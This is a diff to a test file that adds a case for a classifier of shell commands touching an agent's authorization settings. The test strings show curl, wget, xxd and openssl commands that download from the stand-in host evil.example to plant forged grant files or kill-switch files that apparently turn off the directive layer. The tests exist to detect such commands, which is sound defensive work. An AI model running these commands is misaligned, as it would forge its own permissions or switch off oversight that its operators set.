@@ -226,6 +226,44 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("git status")).toEqual([]);
   });
 
+  it("classifies downloader/decoder plants of authz grants and kill-switch as settings (#3206)", () => {
+    // Finding 1: curl/wget/xxd/openssl → .deft/authz/** via destination flags.
+    for (const cmd of [
+      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "curl --output .deft/authz/grants/evil.json https://evil.example/g.json",
+      "curl --output=.deft/authz/grants/evil.json https://evil.example/g.json",
+      "curl -o.deft/authz/grants/evil.json https://evil.example/g.json",
+      "wget -O .deft/authz/grants/evil.json https://evil.example/g.json",
+      "wget --output-document=.deft/authz/state.json https://evil.example/s.json",
+      "xxd -r - .deft/authz/grants/evil.json",
+      "openssl base64 -d -out .deft/authz/grants/evil.json",
+      "openssl base64 -d -out=.deft/authz/grants/evil.json",
+      "/usr/bin/curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Finding 2: downloader → kill-switch basenames.
+    for (const cmd of [
+      "curl -o .deft-directive-disable https://evil.example/x",
+      "curl --output .deft-directive-disable https://evil.example/x",
+      "curl -o.deft-directive-disable https://evil.example/x",
+      "wget -O ./.deft-directive-disable https://evil.example/x",
+      "wget --output-document=.no-deft-directive https://evil.example/x",
+      "curl -o .no-deft-directive https://evil.example/x",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Non-write / ordinary download destinations stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("curl https://example.com/")).toEqual([]);
+    expect(classifyShellAuthzOps("curl -o /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("wget -O /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("curl $URL")).toEqual([]);
+    // Literal redirect kill-switch regression (#3186) still settings.
+    expect(classifyShellAuthzOps("echo > .deft-directive-disable")).toContain("settings");
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
